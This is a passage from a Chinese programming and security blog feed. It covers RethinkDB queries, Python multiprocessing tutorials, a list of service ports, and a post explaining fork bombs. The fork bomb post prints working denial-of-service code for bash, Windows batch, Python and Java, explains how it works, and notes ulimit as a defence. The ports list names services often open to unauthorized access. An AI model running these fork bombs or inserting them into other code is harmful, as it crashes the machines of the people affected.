<h5 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">import rethinkdb as r</div><div class="line">class dbOperation():</div><div class="line">    def __init__(self,dbname,tablename):</div><div class="line">        self.conn = r.connect(host=<span class="string">"localhost"</span>,port=29015)</div><div class="line">        self.table = r.db(dbname).table(tablename)</div><div class="line"></div><div class="line">    def Insert(self,document):</div><div class="line">        <span class="string">''</span><span class="string">'</span></div><div class="line">        插入记录到数据库</div><div class="line">        '<span class="string">''</span></div><div class="line">        <span class="built_in">return</span> self.table.insert(document, conflict=<span class="string">"update"</span>).run(self.conn)</div><div class="line"></div><div class="line">    def query(self,**kwargs):</div><div class="line">        <span class="string">''</span><span class="string">'</span></div><div class="line">        自定义查询</div><div class="line">        '<span class="string">''</span></div><div class="line">        f=self.table.run(self.conn)  <span class="comment">##选择网站名称为空的记录。</span></div><div class="line">        content=[]</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> f:</div><div class="line">            content.append(i)</div><div class="line">        <span class="built_in">return</span> content</div></pre></td></tr></table></figure>
<p>详情请参考：<a href="https://rethinkdb.com/docs/cookbook/python/" target="_blank" rel="external">https://rethinkdb.com/docs/cookbook/python/</a></p>
<h3 id="Data-Explorer工具"><a href="#Data-Explorer工具" class="headerlink" title="Data Explorer工具"></a>Data Explorer工具</h3><p>这是rethinkdb自带的一个工具，可用执行数据库语句，查询修改数据库内容。<br><img src="/upload_image/20170207/2.png" alt=""></p>
<h4 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">r.db(<span class="string">""</span>).table(<span class="string">""</span>).count()</div><div class="line">r.db(<span class="string">""</span>).table(<span class="string">""</span>).filter(&#123;<span class="string">""</span>:<span class="string">""</span>&#125;)</div><div class="line">r.table(<span class="string">'movies'</span>).filter(&#123;rank: 1&#125;)</div><div class="line">r.table(<span class="string">'movies'</span>).without(<span class="string">'id'</span>).distinct().count()   删除重复项</div><div class="line">r.table(<span class="string">'moviesUnique'</span>).orderBy(<span class="string">'rank'</span>).limit(10)  显示前十大电影</div><div class="line">r.table(<span class="string">'moviesUnique'</span>).orderBy(r.desc(<span class="string">'rank'</span>)).limit(10)</div></pre></td></tr></table></figure>
<p>详情请参考：<a href="https://rethinkdb.com/docs/reql-data-exploration/" target="_blank" rel="external">https://rethinkdb.com/docs/reql-data-exploration/</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Fork Bomb]]></title>
      <url>http://thief.one/2017/02/04/Fork-Bomb/</url>
      <content type="html"><![CDATA[<p>　　Fork炸弹（fork bomb）在计算机领域中是一种利用系统调用fork（或其他等效的方式）进行的拒绝服务攻击。fork炸弹以极快的速度创建大量进程（进程数呈以2为底数的指数增长趋势），并以此消耗系统分配予进程的可用空间使进程表饱和，而系统在进程表饱和后就无法运行新程序，除非进程表中的某一进程终止，它可以利用在windows/linux等系统。</p>
<h4 id="linux系统"><a href="#linux系统" class="headerlink" title="linux系统"></a>linux系统</h4><h5 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:()&#123; :|:&amp; &#125;;:</div></pre></td></tr></table></figure>
<h5 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h5><p>:()　# 定义函数,函数名为”:”,即每当输入”:”时就会自动调用{}内代码<br>{　　# “:”函數起始字元<br>:　　# 用递归方式调用”:”函数本身<br>|　　# 並用管線(pipe)將其輸出引至…（因为有一个管線操作字元，因此會生成一個新的進程）<br>:　　# 另一次递归调用的”:”函数 # 综上,”:|:”表示的即是每次調用函数”:”的時候就會產生兩份拷貝<br>&amp;　　# 調用間脱鉤,以使最初的”:”函数被關閉後為其所調用的兩個”:”函數還能繼續執行<br>}　　# “:”函數終止字元<br>;　　# “:”函数定义结束后将要进行的操作…<br>:　　# 调用”:”函数,”引爆”fork炸弹</p>
<h4 id="Windows系统-创建一个-bat，写入以下命令运行即可"><a href="#Windows系统-创建一个-bat，写入以下命令运行即可" class="headerlink" title="Windows系统(创建一个.bat，写入以下命令运行即可)"></a>Windows系统(创建一个.bat，写入以下命令运行即可)</h4><h5 id="Code-1"><a href="#Code-1" class="headerlink" title="Code"></a>Code</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%0|%0|%0</div></pre></td></tr></table></figure>
<h5 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h5><p>%0就是输出自己本身,也就是.bat，在cmd中即表示运行.bat<br>|%0就是打开自身后的程序再打开.bat<br>3的指数倍</p>
<h5 id="预防"><a href="#预防" class="headerlink" title="预防"></a>预防</h5><p>一个防止其严重影响系统的方法就是限定一个用户能够创建的进程数的上限，在Linux系统上，可以通过ulimit这个指令达到相应的效果。</p>
<h4 id="编程语言应用"><a href="#编程语言应用" class="headerlink" title="编程语言应用"></a>编程语言应用</h4><p>Using Python:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">import os</div><div class="line"><span class="keyword">while</span> 1:</div><div class="line">    os.fork()</div></pre></td></tr></table></figure>
<p>Using Java:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">public class ForkBomb</div><div class="line">&#123;</div><div class="line">  public static void main(String[] args)</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)</div><div class="line">    &#123;</div><div class="line">      Runtime.getRuntime().exec(new String[]&#123;<span class="string">"javaw"</span>, <span class="string">"-cp"</span>, System.getProperty(<span class="string">"java.class.path"</span>), <span class="string">"ForkBomb"</span>&#125;);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>官方参考链接：<a href="https://en.wikipedia.org/wiki/Fork_bomb" target="_blank" rel="external">https://en.wikipedia.org/wiki/Fork_bomb</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[常用端口服务]]></title>
      <url>http://thief.one/2017/01/24/%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1/</url>
      <content type="html"><![CDATA[<p>范围：0-65535<br>固定端口：0-1023   1024保留<br>动态端口：1024-65535</p>
<h4 id="常用端口"><a href="#常用端口" class="headerlink" title="常用端口"></a>常用端口</h4><p>21：FTP<br>22：SSH<br>23：Telnet<br>25：SMTP<br>53：DNS（UDP）<br>69：TFTP（cisco，类似FTP）<br>79：Finger<br>80：HTTP<br>110：POP3<br>111：RPC 远程过程调用<br>113：windows 验证服务<br>119：NNTP 网络新闻组传输协议<br>135：RPC 远程过程调用<br>137：NetBIOS<br>139：windows文件和打印机共享，Unix中的samba服务<br>161：SNMP 简单网络管理协议<br>389：LDAP<br>443：HTTPS<br>445：SMB<br>1080：socks代理服务<br>2601,2604：zebra路由，默认密码zebra<br>5900：vnc<br>8080：用户www代理服务</p>
<h4 id="木马病毒"><a href="#木马病毒" class="headerlink" title="木马病毒"></a>木马病毒</h4><p>5554：worm.Sasser病毒利用端口<br>7626：冰河病毒<br>8011：WAY2.4病毒<br>7306：Netspy3.0病毒<br>1024：YAI病毒</p>
<h4 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h4><p>7001,7002：weblogic<br>9080：webshpere应用程序<br>9090：webshpere管理工具<br>8080：tomcat默认端口<br>Jboss通常占用的端口是1098，1099，4444，4445，8080，8009，8083，8093，默认为8080</p>
<h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><p>3306：mysql<br>1433：sqlserver server<br>1434：sqlserver monitor<br>1521：oracle<br>5432：PostgreSQL<br>1158：ORACLE EMCTL<br>8080：Oracle XDB<br>2100：Oracle XDB FTP</p>
<h4 id="特殊服务（漏洞）"><a href="#特殊服务（漏洞）" class="headerlink" title="特殊服务（漏洞）"></a>特殊服务（漏洞）</h4><p>443：SSL心脏滴血<br>512,513,514：Rsync未授权访问<br>873：Rsync未授权访问<br>2375：docker remote api漏洞<br>5984：CouchDB<br>6379：redis未授权<br>7001,7002：WebLogic 默认弱口令，反序列化<br>9200,9300：elasticsearch未授权访问<br>11211：memcache未授权访问<br>27017,27018：Mongodb 未授权访问<br>28017：mongodb统计页面<br>50000：SAP命令执行<br>50070,50030：hadoop默认端口未授权访问</p>
<p><em>参考链接：<a href="https://www.secpulse.com/archives/54880.html" target="_blank" rel="external">https://www.secpulse.com/archives/54880.html</a></em></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Multiprocessing共享资源]]></title>
      <url>http://thief.one/2016/11/24/Multiprocessing%E5%85%B1%E4%BA%AB%E8%B5%84%E6%BA%90/</url>
      <content type="html"><![CDATA[<p>　　在使用多进程的过程中，最好不要使用共享资源，如果非得使用，则请往下看。Multiprocessing类中共享资源可以使用3种方式，分别是Queue，Array，Manager。这三个都是Multiprocessing自带的组件，使用起来也非常方便。注意：普通的全局变量是不能被子进程所共享的，只有通过Multiprocessing组件构造的数据结构可以被共享。</p>
<h3 id="Queue类"><a href="#Queue类" class="headerlink" title="Queue类"></a>Queue类</h3><p>使用Multiprocessing.Queue类，共享资源（share memory）（只适用Process类）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">from multiprocessing import Process, Queue  </div><div class="line"></div><div class="line">def <span class="built_in">test</span>(queue):  </div><div class="line">    queue.put(<span class="string">"Hello World"</span>)  </div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    q = Queue()  </div><div class="line">    p = Process(target=<span class="built_in">test</span>, args=(q,))  <span class="comment">#需要将q对象传递给子进程</span></div><div class="line">    p.start()</div><div class="line"></div><div class="line">    <span class="built_in">print</span> q.get()</div></pre></td></tr></table></figure>
<p>缺点：不能再Pool进程池中使用。</p>
<h3 id="Array、Value类"><a href="#Array、Value类" class="headerlink" title="Array、Value类"></a>Array、Value类</h3><p>使用Multiprocessing.Array类，共享资源（share memory）（只适用于Process类）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">from multiprocessing import Process, Array</div><div class="line"></div><div class="line">def <span class="built_in">test</span>(a):</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</div><div class="line">        a[i] = <span class="_">-a</span>[i]</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    arr = Array(<span class="string">'i'</span>, range(10))</div><div class="line">    p = Process(target=<span class="built_in">test</span>, args=(arr))  <span class="comment">#需要将arr对象传递给子进程</span></div><div class="line">    p.start()</div><div class="line">    p.join()</div><div class="line">    <span class="built_in">print</span> arr[:]</div></pre></td></tr></table></figure>
<p>缺点：无法与Pool一起使用。</p>
<h3 id="Manager类"><a href="#Manager类" class="headerlink" title="Manager类"></a>Manager类</h3><p>使用Multiprocessing.Manager类，共享资源。（可以适用Pool类）</p>
<p>说明：由于windows操作系统下，创建Multiprocessing类对象代码一定要放在main()函数下，而linux不需要，因此这里区分2个版本。</p>
<p>实例目的：父进程在执行子进程的过程中，同步判断一个公共资源值，如果满足条件则结束所有进程。</p>
<h4 id="linux版本"><a href="#linux版本" class="headerlink" title="linux版本"></a>linux版本</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">from multiprocessing import Manager,Pool</div><div class="line"></div><div class="line">lists=Manager().list()    <span class="comment">##定义可被子进程共享的全局变量lists</span></div><div class="line"></div><div class="line">def <span class="built_in">test</span>(i):</div><div class="line">     <span class="built_in">print</span> i</div><div class="line">     lists.append(i)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">    pool=Pool()</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(10000000):</div><div class="line">    	<span class="string">''</span><span class="string">'</span></div><div class="line">    	判断如果lists长度大于0，则不再往进程池中添加进程。</div><div class="line">    	'<span class="string">''</span></div><div class="line">        <span class="keyword">if</span> len(lists)&lt;=0:</div><div class="line">            pool.apply_async(<span class="built_in">test</span>,args=(i,))</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="built_in">break</span></div><div class="line">     pool.close()</div><div class="line">     pool.join()</div></pre></td></tr></table></figure>
<p>优点：可以跟Pool一起用，且速度比较快。</p>
<h4 id="windows版本"><a href="#windows版本" class="headerlink" title="windows版本"></a>windows版本</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">from multiprocessing import Manager</div><div class="line"></div><div class="line">def <span class="built_in">test</span>(i,lists):</div><div class="line">     <span class="built_in">print</span> i</div><div class="line">     lists.append(i)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">    pool=Pool()</div><div class="line">    lists=Manager().list() <span class="comment">#Manager类实例化代码只能写在main()函数里面</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(10000000):</div><div class="line">        <span class="keyword">if</span> len(lists)&lt;=0:</div><div class="line">        	<span class="string">''</span><span class="string">'</span></div><div class="line">        	在创建子进程时，需要将lists对象传入，不然无法共享。</div><div class="line">        	'<span class="string">''</span></div><div class="line">            pool.apply_async(<span class="built_in">test</span>,args=(i,lists))<span class="comment">##需要将lists对象传递给子进程，这里比较耗资源，原因可能是因为Manager类是基于通信的。</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="built_in">break</span></div></pre></td></tr></table></figure>
<p>说明：与linux版本代码相比，windows下代码将lists的引用放在了main()之后，因为windows下只能在main函数下引用多进程。而在实例化子进程时，必须把Manager对象传递给子进程，否则lists无法被共享，而这个过程会消耗巨大资源，因此性能很差。<br>缺点：速度很慢，因此在windows下想要提前结束所有进程，可以使用获取返回值的方式，参考<a href="http://thief.one/2016/11/24/Multiprocessing子进程返回值">Multiprocessing子进程返回值</a></p>
<p><hr><br>更多多进程用法，请移驾:    <a href="http://thief.one/2016/11/23/Python-multiprocessing/">Python Multiprocessing</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Multiprocessing子进程返回值]]></title>
      <url>http://thief.one/2016/11/24/Multiprocessing%E5%AD%90%E8%BF%9B%E7%A8%8B%E8%BF%94%E5%9B%9E%E5%80%BC/</url>
      <content type="html"><![CDATA[<p>　　在实际使用多进程的时候，可能需要获取到子进程运行的返回值。如果只是用来存储，则可以将返回值保存到一个数据结构中；如果需要判断此返回值，从而决定是否继续执行所有子进程，则会相对比较复杂。另外在Multiprocessing中，可以利用Process与Pool创建子进程，这两种用法在获取子进程返回值上的写法上也不相同。这篇中，我们直接上代码，分析多进程中获取子进程返回值的不同用法，以及优缺点。</p>
<h4 id="初级用法（Pool）"><a href="#初级用法（Pool）" class="headerlink" title="初级用法（Pool）"></a>初级用法（Pool）</h4><p>目的：存储子进程返回值</p>
<p>说明：如果只是单纯的存储子进程返回值，则可以使用Pool的apply_async异步进程池；当然也可以使用Process，用法与threading中的相同，这里只介绍前者。</p>
<p>实例：当进程池中所有子进程执行完毕后，输出每个子进程的返回值。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">from multiprocessing import Pool</div><div class="line"></div><div class="line">def <span class="built_in">test</span>(p):     </div><div class="line">    <span class="built_in">return</span> p</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">    pool = Pool(processes=10)</div><div class="line">    result=[]</div><div class="line">    <span class="keyword">for</span> i  <span class="keyword">in</span> xrange(50000):</div><div class="line">       <span class="string">''</span><span class="string">'</span></div><div class="line">       for循环执行流程：</div><div class="line">       （1）添加子进程到pool，并将这个对象（子进程）添加到result这个列表中。（此时子进程并没有运行）</div><div class="line">       （2）执行子进程（同时执行10个）</div><div class="line">       '<span class="string">''</span></div><div class="line">       result.append(pool.apply_async(<span class="built_in">test</span>, args=(i,)))<span class="comment">#维持执行的进程总数为10，当一个进程执行完后添加新进程.       </span></div><div class="line">    pool.join()</div><div class="line"></div><div class="line">    <span class="string">''</span><span class="string">'</span></div><div class="line">    遍历result列表，取出子进程对象，访问get()方法，获取返回值。（此时所有子进程已执行完毕）</div><div class="line">    '<span class="string">''</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> result:</div><div class="line">        <span class="built_in">print</span> i.get()</div></pre></td></tr></table></figure>
<p>错误写法：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> i  <span class="keyword">in</span> xrange(50000):</div><div class="line">   t=pool.apply_async(<span class="built_in">test</span>, args=(i,)))</div><div class="line">   <span class="built_in">print</span> t.get()</div></pre></td></tr></table></figure>
<p>说明：这样会造成阻塞，因为get()方法只能等子进程运行完毕后才能调用成功，否则会一直阻塞等待。如果写在for循环内容，相当于变成了同步，执行效率将会非常低。</p>
<h4 id="高级用法（Pool）"><a href="#高级用法（Pool）" class="headerlink" title="高级用法（Pool）"></a>高级用法（Pool）</h4><p>目的：父进程实时获取子进程返回值，以此为标记结束所有进程。</p>
<h5 id="实例（一）"><a href="#实例（一）" class="headerlink" title="实例（一）"></a>实例（一）</h5><p>执行子进程的过程中，不断获取返回值并校验，如果返回值为True则结果所有进程。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">from multiprocessing import Pool</div><div class="line">import Queue</div><div class="line">import time</div><div class="line"></div><div class="line">def <span class="built_in">test</span>(p):</div><div class="line">    time.sleep(0.001)</div><div class="line">    <span class="keyword">if</span> p==10000:</div><div class="line">        <span class="built_in">return</span> True</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="built_in">return</span> False</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">    pool = Pool(processes=10)</div><div class="line">    q=Queue.Queue()</div><div class="line">    <span class="keyword">for</span> i  <span class="keyword">in</span> xrange(50000):</div><div class="line">    	<span class="string">''</span><span class="string">'</span></div><div class="line">    	将子进程对象存入队列中。</div><div class="line">    	'<span class="string">''</span></div><div class="line">        q.put(pool.apply_async(<span class="built_in">test</span>, args=(i,)))<span class="comment">#维持执行的进程总数为10，当一个进程执行完后添加新进程.       </span></div><div class="line">    <span class="string">''</span><span class="string">'</span></div><div class="line">    因为这里使用的为pool.apply_async异步方法，因此子进程执行的过程中，父进程会执行while，获取返回值并校验。</div><div class="line">    '<span class="string">''</span></div><div class="line">    <span class="keyword">while</span> 1:</div><div class="line">        <span class="keyword">if</span> q.get().get():</div><div class="line">            pool.terminate() <span class="comment">#结束进程池中的所有子进程。</span></div><div class="line">            <span class="built_in">break</span></div><div class="line">    pool.join()</div></pre></td></tr></table></figure>
<p>说明：总共要执行50000个子进程（并发数量为10），当其中一个子进程返回True时，结束进程池。因为使用了apply_async为异步进程，因此在执行完for循环的添加子进程操作后（只是添加并没有执行完所有的子进程），可以直接执行while代码，实时判断子进程返回值是否有True，有的话结束所有进程。</p>
<p>优点：不必等到所有子进程结束再结束程序，只要得到想要的结果就可以提前结束，节省资源。</p>
<p>不足：当需要执行的子进程非常大时，不适用，因为for循环在添加子进程时，要花费很长的时间，虽然是异步，但是也需要等待for循环添加子进程操作结束才能执行while代码，因此会比较慢。</p>
<h5 id="实例（二）"><a href="#实例（二）" class="headerlink" title="实例（二）"></a>实例（二）</h5><p>多线程+多进程，添加执行子进程的过程中，不断获取返回值并校验，如果返回值为True则结果所有进程。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">from multiprocessing import Pool</div><div class="line">import Queue</div><div class="line">import threading</div><div class="line">import time</div><div class="line"></div><div class="line">def <span class="built_in">test</span>(p):</div><div class="line">    time.sleep(0.001)</div><div class="line">    <span class="keyword">if</span> p==10000:</div><div class="line">        <span class="built_in">return</span> True</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="built_in">return</span> False</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line"></div><div class="line">    result=Queue.Queue() <span class="comment">#队列</span></div><div class="line">    pool = Pool()</div><div class="line"></div><div class="line">    def pool_th():</div><div class="line">        <span class="keyword">for</span> i  <span class="keyword">in</span> xrange(50000000): <span class="comment">##这里需要创建执行的子进程非常多</span></div><div class="line">            try:</div><div class="line">                result.put(pool.apply_async(<span class="built_in">test</span>, args=(i,)))</div><div class="line">            except:</div><div class="line">                <span class="built_in">break</span></div><div class="line"></div><div class="line">    def result_th():</div><div class="line">        <span class="keyword">while</span> 1:</div><div class="line">            a=result.get().get() <span class="comment">#获取子进程返回值</span></div><div class="line">            <span class="keyword">if</span> a:</div><div class="line">                pool.terminate() <span class="comment">#结束所有子进程</span></div><div class="line">                <span class="built_in">break</span></div><div class="line">    <span class="string">''</span><span class="string">'</span></div><div class="line">    利用多线程，同时运行Pool函数创建执行子进程，以及运行获取子进程返回值函数。</div><div class="line">    '<span class="string">''</span></div><div class="line">    t1=threading.Thread(target=pool_th)</div><div class="line">    t2=threading.Thread(target=result_th)</div><div class="line">    t1.start()</div><div class="line">    t2.start()</div><div class="line">    t1.join()</div><div class="line">    t2.join()</div><div class="line"></div><div class="line">    pool.join()</div></pre></td></tr></table></figure>
<p>执行流程：利用多线程，创建一个执行pool_th函数线程，一个执行result_th函数线程，pool_th函数用来添加进程池，开启进程执行功能函数并将子进程对象存入队列，而result_th()函数用来不停地从队列中取子进程对象，调用get（）方法获取返回值。等发现其中存在子进程的返回值为True时，结束所有进程，最后结束线程。</p>
<p>优点：弥补了实例（一）的不足，即使for循环的子进程数量很多，也能提高性能，因为for循环与判断子进程返回值同时进行。</p>
<p><hr><br>更多多进程用法，请移驾:    <a href="http://thief.one/2016/11/23/Python-multiprocessing/">Python Multiprocessing</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Multiprocessing.Pool]]></title>
      <url>http://thief.one/2016/11/24/Multiprocessing-Pool/</url>
      <content type="html"><![CDATA[<p>　　Multiprocessing.Pool可以提供指定数量的进程供用户调用，当有新的请求提交到pool中时，如果池还没有满，那么就会创建一个新的进程用来执行该请求；但如果池中的进程数已经达到规定最大值，那么该请求就会等待，直到池中有进程结束，才会创建新的进程来执行它。在共享资源时，只能使用Multiprocessing.Manager类，而不能使用Queue或者Array。</p>
<h4 id="Pool介绍"><a href="#Pool介绍" class="headerlink" title="Pool介绍"></a>Pool介绍</h4><h5 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h5><p>Pool类用于需要执行的目标很多，而手动限制进程数量又太繁琐时，如果目标少且不用控制进程数量则可以用<a href="http://thief.one/2016/11/24/Multiprocessing-Process">Process</a>类。</p>
<h5 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h5><ul>
<li>Pool([processes[, initializer[, initargs[, maxtasksperchild[, context]]]]])</li>
<li>processes ：使用的工作进程的数量，如果processes是None那么使用 os.cpu_count()返回的数量。</li>
<li>initializer： 如果initializer是None，那么每一个工作进程在开始的时候会调用initializer(*initargs)。</li>
<li>maxtasksperchild：工作进程退出之前可以完成的任务数，完成后用一个新的工作进程来替代原进程，来让闲置的资源被释放。maxtasksperchild默认是None，意味着只要Pool存在工作进程就会一直存活。</li>
<li>context: 用在制定工作进程启动时的上下文，一般使用 multiprocessing.Pool() 或者一个context对象的Pool()方法来创建一个池，两种方法都适当的设置了context。</li>
</ul>
<h5 id="实例方法"><a href="#实例方法" class="headerlink" title="实例方法"></a>实例方法</h5><ul>
<li>apply_async(func[, args[, kwds[, callback]]]) 它是非阻塞。</li>
<li>apply(func[, args[, kwds]])是阻塞的。</li>
<li>close()    关闭pool，使其不在接受新的任务。</li>
<li>terminate()    关闭pool，结束工作进程，不在处理未完成的任务。</li>
<li>join()    主进程阻塞，等待子进程的退出， join方法要在close或terminate之后使用。</li>
</ul>
<h4 id="Pool使用方法"><a href="#Pool使用方法" class="headerlink" title="Pool使用方法"></a>Pool使用方法</h4><h5 id="Pool-map函数"><a href="#Pool-map函数" class="headerlink" title="Pool+map函数"></a>Pool+map函数</h5><p>说明：此写法缺点在于只能通过map向函数传递一个参数。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">from multiprocessing import Pool</div><div class="line"></div><div class="line">def <span class="built_in">test</span>(i):</div><div class="line">    <span class="built_in">print</span> i</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">	lists=[1,2,3]</div><div class="line">	pool=Pool(processes=2) <span class="comment">#定义最大的进程数</span></div><div class="line">	pool.map(<span class="built_in">test</span>,lists)        <span class="comment">#p必须是一个可迭代变量。</span></div><div class="line">	pool.close()</div><div class="line">	pool.join()</div></pre></td></tr></table></figure>
<h5 id="异步进程池（非阻塞）"><a href="#异步进程池（非阻塞）" class="headerlink" title="异步进程池（非阻塞）"></a>异步进程池（非阻塞）</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">from multiprocessing import Pool</div><div class="line"></div><div class="line">def <span class="built_in">test</span>(i):</div><div class="line">    <span class="built_in">print</span> i</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div 